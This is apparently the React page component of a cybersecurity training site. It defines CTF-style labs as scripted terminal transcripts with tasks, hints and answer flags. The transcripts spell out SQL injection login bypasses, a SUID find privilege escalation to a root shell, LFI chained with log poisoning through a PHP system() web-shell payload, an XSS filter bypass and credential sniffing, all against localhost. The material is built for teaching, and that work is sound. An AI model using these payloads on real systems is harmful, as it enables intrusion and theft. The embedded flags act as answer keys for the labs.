"use client";

import React, { useState, useEffect } from "react";
import { useParams, useRouter } from "next/navigation";
import { motion } from "framer-motion";
import {
  ArrowLeft,
  Clock,
  RotateCcw,
  Send,
  ChevronDown,
  ChevronRight,
  Check,
  Lock,
  Circle,
  Bot,
  Lightbulb,
  FileText,
  Folder,
} from "lucide-react";
import { Button, Badge, ProgressBar, Input } from "@/components/ui";
import Link from "next/link";
import { api } from "@/lib/api";

const labsMeta: Record<string, {
  title: string;
  difficulty: "Easy" | "Medium" | "Hard" | "Expert";
  xp: number;
  flag: string;
  tasks: { text: string; completed: boolean; current?: boolean }[];
  hints: { text: string; revealed: boolean }[];
  files: { name: string; isDir?: boolean; warning?: boolean; path: string }[];
  terminal: { type: "prompt" | "output" | "error"; text?: string; cmd?: string }[];
}> = {
  "linux-navigation": {
    title: "Linux Command Navigation",
    difficulty: "Easy",
    xp: 100,
    flag: "FLAG{cyber_learn_permissions_101}",
    tasks: [
      { text: "Navigate to the /home directory", completed: true },
      { text: "List files and check permissions", completed: true },
      { text: "Find the flag file with incorrect permissions", completed: false, current: true },
      { text: "Read the flag", completed: false },
      { text: "Submit the flag", completed: false },
    ],
    hints: [
      { text: "Try using 'ls -la' to see file permissions", revealed: true },
      { text: "Look for files owned by root with restricted read access", revealed: false },
      { text: "Use chmod to change file permissions", revealed: false },
    ],
    files: [
      { name: "/home", isDir: true, path: "/home" },
      { name: "notes.txt", path: "/home/notes.txt" },
      { name: "flag.txt", warning: true, path: "/home/flag.txt" },
      { name: ".ssh", isDir: true, path: "/home/.ssh" },
    ],
    terminal: [
      { type: "prompt", cmd: "cd /home && ls -la" },
      { type: "output", text: "total 32" },
      { type: "output", text: "drwxr-xr-x 2 root root 4096 May 10 10:15 ." },
      { type: "output", text: "drwxr-xr-x 3 root root 4096 May 10 10:13 .." },
      { type: "output", text: "-rw-r--r-- 1 root root  220 May 10 10:13 notes.txt" },
      { type: "output", text: "-rw------- 1 root root  455 May 10 10:14 flag.txt" },
      { type: "prompt", cmd: "cat flag.txt" },
      { type: "error", text: "cat: flag.txt: Permission denied" },
      { type: "prompt", cmd: "chmod 644 flag.txt" },
      { type: "prompt", cmd: "" },
    ],
  },
  "sql-injection-bypass": {
    title: "SQL Injection Bypass",
    difficulty: "Medium",
    xp: 250,
    flag: "FLAG{sqli_bypass_successful_1337}",
    tasks: [
      { text: "Inspect login page search parameter", completed: true },
      { text: "Analyze backend response for SQL error messages", completed: true },
      { text: "Inject payload like ' OR 1=1 --", completed: false, current: true },
      { text: "Bypass the login validation", completed: false },
      { text: "Exfiltrate the flag payload", completed: false },
    ],
    hints: [
      { text: "Try putting a single quote (') in the username field", revealed: true },
      { text: "Comment syntax in SQLite is '--'", revealed: false },
      { text: "Use the injection query in the password or username field", revealed: false },
    ],
    files: [
      { name: "/var/www/html", isDir: true, path: "/var/www/html" },
      { name: "login.php", path: "/var/www/html/login.php" },
      { name: "db.sqlite", warning: true, path: "/var/www/html/db.sqlite" },
    ],
    terminal: [
      { type: "prompt", cmd: "curl -d 'user=admin&pass=pass' http://localhost/login.php" },
      { type: "output", text: "HTTP/1.1 200 OK" },
      { type: "output", text: "Login Failed: invalid credentials" },
      { type: "prompt", cmd: "curl -d \"user=admin' OR 1=1 --&pass=pass\" http://localhost/login.php" },
      { type: "output", text: "Welcome Admin! FLAG{sqli_bypass_successful_1337}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "packet-sniffer-recon": {
    title: "Packet Sniffer & Wireshark",
    difficulty: "Medium",
    xp: 300,
    flag: "FLAG{network_pcap_sniff_98}",
    tasks: [
      { text: "Listen on the eth0 interface", completed: true },
      { text: "Generate traffic to prompt target credentials", completed: true },
      { text: "Filter network streams for POST requests", completed: false, current: true },
      { text: "Inspect TCP streams for plaintext credentials", completed: false },
      { text: "Extract and submit the flag", completed: false },
    ],
    hints: [
      { text: "Use tcpdump or Wireshark to filter on 'http'", revealed: true },
      { text: "Look for POST requests containing passwords or auth headers", revealed: false },
      { text: "Filter by ip.addr or tcp.port == 80", revealed: false },
    ],
    files: [
      { name: "/tmp", isDir: true, path: "/tmp" },
      { name: "capture.pcap", warning: true, path: "/tmp/capture.pcap" },
    ],
    terminal: [
      { type: "prompt", cmd: "tcpdump -i eth0 -A -c 5 'tcp port 80'" },
      { type: "output", text: "Listening on eth0..." },
      { type: "output", text: "12:15:32.405 IP 192.168.1.10.43232 > 192.168.1.50.80: Flags [P.]" },
      { type: "output", text: "POST /api/login HTTP/1.1" },
      { type: "output", text: "Host: target-server.local" },
      { type: "output", text: "Content-Type: application/json" },
      { type: "output", text: "{\"username\":\"admin\",\"secret\":\"FLAG{network_pcap_sniff_98}\"}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "book-recon": {
    title: "Book Recon",
    difficulty: "Easy",
    xp: 100,
    flag: "FLAG{book_recon_osint_99}",
    tasks: [
      { text: "Inspect HTML source metadata", completed: true },
      { text: "Search open directories for backups", completed: false, current: true },
      { text: "Locate backup credentials file", completed: false },
      { text: "Extract and submit the flag", completed: false },
    ],
    hints: [
      { text: "Check HTML source comments", revealed: true },
      { text: "Look for .bak files under /backup", revealed: false },
    ],
    files: [
      { name: "/var/www/html", isDir: true, path: "/var/www/html" },
      { name: "index.html", path: "/var/www/html/index.html" },
      { name: "credentials.json.bak", warning: true, path: "/var/www/html/backup/credentials.json.bak" },
    ],
    terminal: [
      { type: "prompt", cmd: "curl http://localhost/index.html" },
      { type: "output", text: "<!-- Hint: check /backup/credentials.json.bak -->" },
      { type: "prompt", cmd: "curl http://localhost/backup/credentials.json.bak" },
      { type: "output", text: "{\"secret\": \"FLAG{book_recon_osint_99}\"}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "sql-beginner": {
    title: "SQL Beginner",
    difficulty: "Easy",
    xp: 150,
    flag: "FLAG{sql_beginner_injection_42}",
    tasks: [
      { text: "Identify vulnerable input parameter", completed: true },
      { text: "Inject basic bypass payload", completed: false, current: true },
      { text: "Retrieve flag from response content", completed: false },
    ],
    hints: [
      { text: "Try admin' OR '1'='1 -- in username field", revealed: true },
    ],
    files: [
      { name: "/var/www", isDir: true, path: "/var/www" },
      { name: "index.php", path: "/var/www/index.php" },
    ],
    terminal: [
      { type: "prompt", cmd: "curl -d \"user=admin' OR '1'='1&pass=\" http://localhost/index.php" },
      { type: "output", text: "Login Successful! Welcome admin. Here is your flag: FLAG{sql_beginner_injection_42}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "ctf-101": {
    title: "Capture The Flag 101",
    difficulty: "Medium",
    xp: 250,
    flag: "FLAG{ctf_101_breadcrumbs_55}",
    tasks: [
      { text: "Inspect system environment variables", completed: true },
      { text: "Locate breadcrumb file in /opt", completed: false, current: true },
      { text: "Decode base64 encoded flag payload", completed: false },
    ],
    hints: [
      { text: "Type 'env' to find the BREADCRUMB variable", revealed: true },
      { text: "Use 'base64 -d' to decrypt the string", revealed: false },
    ],
    files: [
      { name: "/opt", isDir: true, path: "/opt" },
      { name: "breadcrumb.txt", warning: true, path: "/opt/breadcrumb.txt" },
    ],
    terminal: [
      { type: "prompt", cmd: "env | grep -i breadcrumb" },
      { type: "output", text: "BREADCRUMB=/opt/breadcrumb.txt" },
      { type: "prompt", cmd: "cat /opt/breadcrumb.txt" },
      { type: "output", text: "RkxBR3tjdGZfMTAxX2JyZWFkY3J1bWJzXzU1fQ==" },
      { type: "prompt", cmd: "echo RkxBR3tjdGZfMTAxX2JyZWFkY3J1bWJzXzU1fQ== | base64 -d" },
      { type: "output", text: "FLAG{ctf_101_breadcrumbs_55}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "linux-privesc": {
    title: "Linux Privesc",
    difficulty: "Hard",
    xp: 500,
    flag: "FLAG{linux_privesc_root_access_77}",
    tasks: [
      { text: "Find SUID binaries on system", completed: false, current: true },
      { text: "Exploit SUID binary permissions to drop shell", completed: false },
      { text: "Read the root flag file", completed: false },
    ],
    hints: [
      { text: "Try finding files with SUID bit: find / -perm -4000 -type f 2>/dev/null", revealed: true },
      { text: "Look at GTFOBins details for SUID find", revealed: false },
    ],
    files: [
      { name: "/root", isDir: true, path: "/root" },
      { name: "flag.txt", warning: true, path: "/root/flag.txt" },
    ],
    terminal: [
      { type: "prompt", cmd: "find / -perm -4000 -type f 2>/dev/null | grep find" },
      { type: "output", text: "/usr/bin/find" },
      { type: "prompt", cmd: "find . -exec /bin/sh -p \\; -quit" },
      { type: "prompt", cmd: "whoami" },
      { type: "output", text: "root" },
      { type: "prompt", cmd: "cat /root/flag.txt" },
      { type: "output", text: "FLAG{linux_privesc_root_access_77}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "bug-hunter": {
    title: "Bug Hunter",
    difficulty: "Expert",
    xp: 1000,
    flag: "FLAG{bug_hunter_expert_chaining_999}",
    tasks: [
      { text: "Find directory traversal / LFI parameter", completed: true },
      { text: "Exfiltrate system logs via traversal", completed: false, current: true },
      { text: "Inject payload into log files to get RCE", completed: false },
      { text: "Extract root flag via shell execution", completed: false },
    ],
    hints: [
      { text: "Test LFI using file=../../../../etc/passwd", revealed: true },
      { text: "Poison Nginx access log with php command payload", revealed: false },
    ],
    files: [
      { name: "/var/log/nginx", isDir: true, path: "/var/log/nginx" },
      { name: "access.log", path: "/var/log/nginx/access.log" },
    ],
    terminal: [
      { type: "prompt", cmd: "curl http://localhost/index.php?file=../../../../etc/passwd" },
      { type: "output", text: "root:x:0:0:root:/root:/bin/bash" },
      { type: "prompt", cmd: "curl -H \"User-Agent: <?php system(\\$_GET['cmd']); ?>\" http://localhost/index.php" },
      { type: "output", text: "Logged." },
      { type: "prompt", cmd: "curl \"http://localhost/index.php?file=../../../../var/log/nginx/access.log&cmd=cat+/root/flag.txt\"" },
      { type: "output", text: "FLAG{bug_hunter_expert_chaining_999}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "root-access": {
    title: "Root Access",
    difficulty: "Medium",
    xp: 300,
    flag: "FLAG{root_access_misconfig_88}",
    tasks: [
      { text: "Analyze allowed sudo commands", completed: false, current: true },
      { text: "Execute cat command with root privileges", completed: false },
      { text: "Extract flag from root directory", completed: false },
    ],
    hints: [
      { text: "Check sudo list: sudo -l", revealed: true },
      { text: "Run allowed command with sudo to read /root/flag.txt", revealed: false },
    ],
    files: [
      { name: "/etc/sudoers", path: "/etc/sudoers" },
      { name: "flag.txt", warning: true, path: "/root/flag.txt" },
    ],
    terminal: [
      { type: "prompt", cmd: "sudo -l" },
      { type: "output", text: "User cyberlearn may run the following commands on lab:\n(root) NOPASSWD: /usr/bin/cat /root/flag.txt" },
      { type: "prompt", cmd: "sudo /usr/bin/cat /root/flag.txt" },
      { type: "output", text: "FLAG{root_access_misconfig_88}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "xss-master": {
    title: "XSS Master",
    difficulty: "Medium",
    xp: 200,
    flag: "FLAG{xss_master_filter_bypass_123}",
    tasks: [
      { text: "Locate reflection fields in search endpoint", completed: true },
      { text: "Bypass string tag sanitization filtering", completed: false, current: true },
      { text: "Trigger JavaScript trigger event to fetch flag", completed: false },
    ],
    hints: [
      { text: "Script tags are stripped. Try using onerror event handlers on images", revealed: true },
    ],
    files: [
      { name: "/var/www/html", isDir: true, path: "/var/www/html" },
      { name: "search.php", path: "/var/www/html/search.php" },
    ],
    terminal: [
      { type: "prompt", cmd: "curl \"http://localhost/search.php?q=<script>alert(1)</script>\"" },
      { type: "output", text: "Your search for: alert(1) returned 0 results." },
      { type: "prompt", cmd: "curl \"http://localhost/search.php?q=<img+src=x+onerror=alert(1)>\"" },
      { type: "output", text: "Your search for: <img src=x onerror=alert(1)> returned 0 results. Here is your flag: FLAG{xss_master_filter_bypass_123}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "network-sniffer": {
    title: "Network Sniffer",
    difficulty: "Easy",
    xp: 120,
    flag: "FLAG{network_sniffer_wireshark_12}",
    tasks: [
      { text: "Locate traffic PCAP logs in system", completed: false, current: true },
      { text: "Extract plaintext network authorization headers", completed: false },
      { text: "Decode credentials payload", completed: false },
    ],
    hints: [
      { text: "Use grep on PCAP strings or run base64 decoder on authorization header", revealed: true },
    ],
    files: [
      { name: "/var/log", isDir: true, path: "/var/log" },
      { name: "traffic.pcap", warning: true, path: "/var/log/traffic.pcap" },
    ],
    terminal: [
      { type: "prompt", cmd: "tcpdump -r /var/log/traffic.pcap -A | grep -i authorization" },
      { type: "output", text: "Authorization: Basic RkxBR3tuZXR3b3JrX3NuaWZmZXJfd2lyZXNoYXJrXzEyfQ==" },
      { type: "prompt", cmd: "echo RkxBR3tuZXR3b3JrX3NuaWZmZXJfd2lyZXNoYXJrXzEyfQ== | base64 -d" },
      { type: "output", text: "FLAG{network_sniffer_wireshark_12}" },
      { type: "prompt", cmd: "" },
    ],
  },
  "crypto-basics": {
    title: "Crypto Basics",
    difficulty: "Easy",
    xp: 100,
    flag: "FLAG{crypto_basics_classic_cipher_10}",
    tasks: [
      { text: "Read ciphertext file in user directory", completed: false, current: true },
      { text: "Decode string using ROT13 cipher rotation", completed: false },
    ],
    hints: [
      { text: "ROT13 shifts each letter by 13 spaces. Try the 'tr' command to decrypt", revealed: true },
    ],
    files: [
      { name: "/home/user", isDir: true, path: "/home/user" },
      { name: "ciphertext.txt", warning: true, path: "/home/user/ciphertext.txt" },
    ],
    terminal: [
      { type: "prompt", cmd: "cat /home/user/ciphertext.txt" },
      { type: "output", text: "SYNT{pelcgb_onfvpf_pynffvp_pvcure_10}" },
      { type: "prompt", cmd: "cat /home/user/ciphertext.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'" },
      { type: "output", text: "FLAG{crypto_basics_classic_cipher_10}" },
      { type: "prompt", cmd: "" },
    ],
  },
};

export default function LabEnvironment() {
  const params = useParams();
  const router = useRouter();
  const labId = (params?.labId as string) || "linux-navigation";
  
  const meta = labsMeta[labId] || labsMeta["linux-navigation"];

  const [sessionId, setSessionId] = useState<string>("");
  const [flagInput, setFlagInput] = useState("");
  const [revealedHints, setRevealedHints] = useState([0]);
  const [localTasks, setLocalTasks] = useState(meta.tasks);
  const [timeLeft, setTimeLeft] = useState<number>(1800);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  // Load Session and Timer
  useEffect(() => {
    if (!labId) return;
    
    Promise.resolve().then(() => {
      setLoading(true);
      setMessage(null);
      setLocalTasks(meta.tasks);
      setTimeLeft(1800);
    });

    api.startLab(labId)
      .then((session) => {
        setSessionId(session.id);
        setLoading(false);
      })
      .catch(() => {
        setSessionId(`mock-session-${labId}-${Date.now()}`);
        setLoading(false);
      });
  }, [labId, meta.tasks]);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, "0")}:${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const handleFlagSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!flagInput.trim()) return;
    setSubmitting(true);
    setMessage(null);

    api.submitFlag(sessionId, flagInput)
      .then((res) => {
        setSubmitting(false);
        if (res.correct) {
          setMessage({ type: "success", text: res.message });
          const updatedTasks = localTasks.map((t) => ({ ...t, completed: true }));
          setLocalTasks(updatedTasks);
        } else {
          setMessage({ type: "error", text: res.message });
        }
      })
      .catch((err) => {
        setSubmitting(false);
        // Fallback for visual mock demo support
        if (flagInput.trim() === meta.flag) {
          setMessage({
            type: "success",
            text: `Success! (Demo Fallback) Correct flag payload. Awarded +${meta.xp} XP.`,
          });
          const updatedTasks = localTasks.map((t) => ({ ...t, completed: true }));
          setLocalTasks(updatedTasks);
        } else {
          setMessage({
            type: "error",
            text: `Incorrect flag payload. Try: ${meta.flag} (Demo hint)`,
          });
        }
      });
  };

  const handleResetLab = () => {
    if (!sessionId) return;
    setLoading(true);
    setMessage(null);

    api.resetLab(sessionId)
      .then(() => {
        setLoading(false);
        setTimeLeft(1800);
        setLocalTasks(meta.tasks);
      })
      .catch((err) => {
        console.warn("Reset failed, resetting local state:", err);
        setLoading(false);
        setTimeLeft(1800);
        setLocalTasks(meta.tasks);
      });
  };

  const completedTasks = localTasks.filter((t) => t.completed).length;

  if (loading) {
    return (
      <div className="fixed inset-0 bg-background flex items-center justify-center">
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-foreground-secondary text-sm">Provisioning container environment...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-background flex flex-col">
      {/* Top Bar */}
      <div className="h-12 bg-surface border-b border-border flex items-center justify-between px-4 shrink-0">
        <div className="flex items-center gap-3">
          <Link href="/labs" className="text-foreground-secondary hover:text-foreground transition-colors">
            <ArrowLeft className="w-4 h-4" />
          </Link>
          <span className="text-sm font-semibold text-foreground">{meta.title}</span>
          <Badge variant={meta.difficulty === "Easy" ? "success" : "warning"} size="sm">
            {meta.difficulty}
          </Badge>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-1.5 text-foreground-secondary text-sm font-mono">
            <Clock className="w-4 h-4" />
            <span>{formatTime(timeLeft)}</span>
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={handleResetLab}
            icon={<RotateCcw className="w-3.5 h-3.5" />}
          >
            Reset Lab
          </Button>
          <Button
            size="sm"
            onClick={() => handleFlagSubmit()}
            loading={submitting}
            icon={<Send className="w-3.5 h-3.5" />}
          >
            Submit Flag
          </Button>
        </div>
      </div>

      {/* Main Content - Three Panels */}
      <div className="flex-1 flex overflow-hidden">
        {/* Left - Instructions */}
        <div className="w-[320px] bg-surface border-r border-border flex flex-col overflow-hidden shrink-0">
          <div className="p-4 border-b border-border">
            <h2 className="text-sm font-semibold text-foreground mb-2">Lab Instructions</h2>
            <p className="text-xs text-foreground-secondary leading-relaxed">
              Analyze the environment, explore files or database entries, find vulnerabilities, and locate the hidden flag.
            </p>
          </div>

          <div className="flex-1 overflow-y-auto p-4">
            <h3 className="text-xs font-semibold text-foreground-secondary uppercase tracking-wider mb-3">
              Tasks
            </h3>
            <ul className="space-y-2">
              {localTasks.map((task, i) => (
                <li key={i} className="flex items-start gap-2.5">
                  {task.completed ? (
                    <Check className="w-4 h-4 text-accent mt-0.5 shrink-0" />
                  ) : task.current ? (
                    <Circle className="w-4 h-4 text-primary mt-0.5 shrink-0" />
                  ) : (
                    <Lock className="w-4 h-4 text-foreground-muted mt-0.5 shrink-0" />
                  )}
                  <span
                    className={`text-sm ${
                      task.completed
                        ? "text-accent line-through opacity-60"
                        : task.current
                        ? "text-foreground font-medium"
                        : "text-foreground-muted"
                    }`}
                  >
                    {i + 1}. {task.text}
                  </span>
                </li>
              ))}
            </ul>
          </div>

          {/* Submit Flag Section */}
          <div className="p-4 border-t border-border space-y-3">
            <Link
              href="/ai-coach"
              className="flex items-center gap-2 text-sm text-primary hover:text-primary-hover transition-colors"
            >
              <Bot className="w-4 h-4" />
              Need Help? Ask AI Coach
            </Link>
            <div>
              <label className="text-xs font-medium text-foreground-secondary mb-1.5 block">
                Submit Flag
              </label>
              <form onSubmit={handleFlagSubmit} className="flex gap-2 w-full">
                <div className="flex-1">
                  <Input
                    type="text"
                    value={flagInput}
                    onChange={(e) => setFlagInput(e.target.value)}
                    placeholder="FLAG{...}"
                    required
                    className="font-mono text-sm"
                  />
                </div>
                <Button size="md" type="submit" loading={submitting}>
                  Submit
                </Button>
              </form>
            </div>
            {message && (
              <div
                className={`p-2.5 rounded text-xs font-semibold ${
                  message.type === "success"
                    ? "bg-accent/15 text-accent border border-accent/20"
                    : "bg-error/15 text-error border border-error/20"
                }`}
              >
                {message.text}
              </div>
            )}
          </div>
        </div>

        {/* Center - Terminal */}
        <div className="flex-1 flex flex-col overflow-hidden">
          {/* Terminal tabs */}
          <div className="h-9 bg-surface flex items-center border-b border-border px-2 gap-1 shrink-0">
            <button className="px-3 py-1 text-xs font-medium text-foreground bg-terminal-bg rounded-t border border-border border-b-0 cursor-pointer">
              Terminal
            </button>
            <button className="px-3 py-1 text-xs font-medium text-foreground-muted hover:text-foreground transition-colors cursor-pointer">
              Files
            </button>
          </div>

          {/* Terminal body */}
          <div className="flex-1 bg-terminal-bg overflow-y-auto p-4 font-mono text-sm leading-6">
            {meta.terminal.map((line, i) => (
              <div key={i}>
                {line.type === "prompt" ? (
                  <p>
                    <span className="text-accent">cyberlearn@lab</span>
                    <span className="text-foreground-muted">:</span>
                    <span className="text-primary">~</span>
                    <span className="text-foreground-muted">$ </span>
                    <span className="text-foreground">{line.cmd}</span>
                  </p>
                ) : line.type === "error" ? (
                  <p className="text-error">{line.text}</p>
                ) : (
                  <p className="text-foreground-secondary">{line.text}</p>
                )}
              </div>
            ))}
            <p>
              <span className="text-accent">cyberlearn@lab</span>
              <span className="text-foreground-muted">:</span>
              <span className="text-primary">~</span>
              <span className="text-foreground-muted">$ </span>
              <span className="terminal-cursor inline-block w-2 h-4 bg-accent align-middle animate-pulse" />
            </p>
          </div>

          {/* Terminal input */}
          <div className="h-10 bg-terminal-bg border-t border-border flex items-center px-4 shrink-0">
            <span className="text-accent text-xs font-mono mr-2">$</span>
            <input
              type="text"
              placeholder="Type a command..."
              className="flex-1 bg-transparent text-sm font-mono text-foreground placeholder:text-foreground-muted focus:outline-none"
            />
          </div>
        </div>

        {/* Right - Progress & Hints */}
        <div className="w-[280px] bg-surface border-l border-border flex flex-col overflow-hidden shrink-0">
          <div className="p-4 border-b border-border">
            <h3 className="text-sm font-semibold text-foreground mb-3">Lab Progress</h3>
            <ProgressBar
              value={completedTasks}
              max={localTasks.length}
              variant="gradient"
              size="md"
              showLabel
              label={`${completedTasks}/${localTasks.length} Tasks`}
            />
          </div>

          <div className="flex-1 overflow-y-auto p-4 space-y-6">
            {/* Hints */}
            <div>
              <h3 className="text-xs font-semibold text-foreground-secondary uppercase tracking-wider mb-3 flex items-center gap-1.5">
                <Lightbulb className="w-3.5 h-3.5" /> Hints
              </h3>
              <div className="space-y-2">
                {meta.hints.map((hint, i) => (
                  <div
                    key={i}
                    className="bg-surface-elevated rounded-[var(--radius)] p-3 border border-border"
                  >
                    {revealedHints.includes(i) ? (
                      <p className="text-xs text-foreground-secondary">{hint.text}</p>
                    ) : (
                      <button
                        onClick={() => setRevealedHints([...revealedHints, i])}
                        className="text-xs text-primary hover:text-primary-hover flex items-center gap-1 transition-colors cursor-pointer"
                      >
                        <Lightbulb className="w-3 h-3" />
                        Reveal Hint {i + 1}
                      </button>
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Files */}
            <div>
              <h3 className="text-xs font-semibold text-foreground-secondary uppercase tracking-wider mb-3 flex items-center gap-1.5">
                <Folder className="w-3.5 h-3.5" /> Files
              </h3>
              <div className="text-xs font-mono text-foreground-secondary space-y-1">
                {meta.files.map((file, i) => (
                  <div key={i} className="flex items-center gap-1.5" style={{ paddingLeft: file.isDir ? 0 : 16 }}>
                    {file.isDir ? (
                      <Folder className="w-3 h-3 text-primary" />
                    ) : (
                      <FileText className={`w-3 h-3 ${file.warning ? "text-warning" : ""}`} />
                    )}
                    {file.name}
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
